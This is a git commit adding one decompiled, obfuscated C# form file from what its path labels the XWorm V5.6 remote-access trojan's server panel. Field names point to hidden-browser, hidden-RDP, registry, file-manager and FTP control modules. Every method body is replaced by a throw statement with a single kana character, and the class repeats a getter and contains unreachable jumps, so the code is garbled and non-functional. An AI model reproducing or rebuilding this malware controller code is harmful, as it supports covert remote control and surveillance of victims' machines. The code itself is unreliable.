43884e0cd208f3619588177f8de3bf1259be76ab
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:28 +0400

    Forms26.cs

---
+++ XWorm V5.6/Server/Forms/Forms26.cs
@@ -0,0 +1,196 @@
+﻿using B55951D293DD740F7B3577CE2C48A401;
+using CAFDB0AD5C0090F49A98AA5C877499B7;
+using FB656BD0FD55CB0EE5FF3EDFB047FABD;
+using FF2D6F102A260C25FF3FD3711F3F0BB9;
+using Guna.UI2.WinForms;
+using L52LFCBD56B2E807B7EC8CEFDB5458AC;
+using Microsoft.VisualBasic.CompilerServices;
+using S7E093DDE35EF95BC8F5A79005912BS1;
+using SS50CB53275F50SC17512D1S56E03705;
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+using U889DF415E37B84E37738U5B22B76D28;
+
+namespace F6F8EED9333F0F8D71E7A14D31419906
+{
+  [DesignerGenerated]
+  public class F52F19CDAAECA06421655E747A6BC70E : Form
+  {
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public S6640E555CS092A8E845F228E804BCA1 m_EditReg;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public SCEBA68B300S5051727F2F1C08CS78A6 m_FileSeacher;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public CE92891172D009CDBDBB0BB897E20EC8 m_FM;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public BB6522B3128741063CF278262694FEB9 m_Ftp;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public FAFCD0C18FFE8F29EF883C1B32FB3915 m_Fun;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public U74CC57DU9422UA94U8D1CC4FD42D357 m_HApps;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public B10DBCC1C9B885C02456BBDA3D2B71CA m_HBrowser;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public F52F19CDAAECA06421655E747A6BC70E m_Hosts;
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public E8AC5898DDA66BCEB297A63FD977EA10 m_HRDP;
+
+    internal virtual StatusStrip StatusStrip1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("べ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("そ");
+    }
+
+    internal virtual ToolStripStatusLabel ToolStripStatusLabel1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("そ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ひ");
+    }
+
+    internal virtual Timer Timer1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("び");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("さ");
+    }
+
+    internal virtual ToolStripMenuItem ToolStripMenuItem1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぞ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("べ");
+    }
+
+    internal virtual MenuStrip MenuStrip1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ょ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("か");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("む");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ゔ");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox2
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("つ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("に");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Timer get_Timer1() => throw new Exception("ぉ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Timer1(Timer WithEventsValue) => throw new Exception("て");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_Guna2TextBox1() => throw new Exception("ヰ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2TextBox1(Guna2TextBox WithEventsValue) => throw new Exception("ひ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_Guna2TextBox2() => throw new Exception("ゆ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2TextBox2(Guna2TextBox WithEventsValue) => throw new Exception("ぴ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2GradientButton get_Guna2GradientButton1() => throw new Exception("た");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2GradientButton1(Guna2GradientButton WithEventsValue) => throw new Exception("ゆ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void FB60F26F37221FBF9AF9EDC8A29FF1E6(object sender, EventArgs e) => throw new Exception("こ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void EC8F09380BF76D4900C99F6B81A15674(object sender, EventArgs e)
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ョ");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void FC2DAD44E6B0E2E02C2ABF9FCAEFC46A(object sender, FormClosingEventArgs e) => throw new Exception("い");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void DBBCCE5CB6BAA4DA5C6E265B21F63469(object sender, EventArgs e) => throw new Exception("ご");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void FC01C0487ACFFB9F5BDC007B7BAEFE7C(object sender, EventArgs e) => throw new Exception("ヱ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public F52F19CDAAECA06421655E747A6BC70E() => throw new Exception("ぁ");
+
+    [DebuggerNonUserCode]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    protected override void Dispose(bool disposing)
+    {
+      try
+      {
+      }
+      finally
+      {
+label_2:
+        throw new Exception("ぁ");
+      }
+      goto label_2;
+    }
+
+    [DebuggerStepThrough]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void FF0BFAF6F186E507999DBBFCFF40BA6E() => throw new Exception("い");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual StatusStrip get_StatusStrip1() => throw new Exception("っ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_StatusStrip1(StatusStrip WithEventsValue) => throw new Exception("ヸ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual ToolStripStatusLabel get_ToolStripStatusLabel1() => throw new Exception("ざ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_ToolStripStatusLabel1(ToolStripStatusLabel WithEventsValue) => throw new Exception("り");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Timer get_Timer1() => throw new Exception("お");
+  }
+}
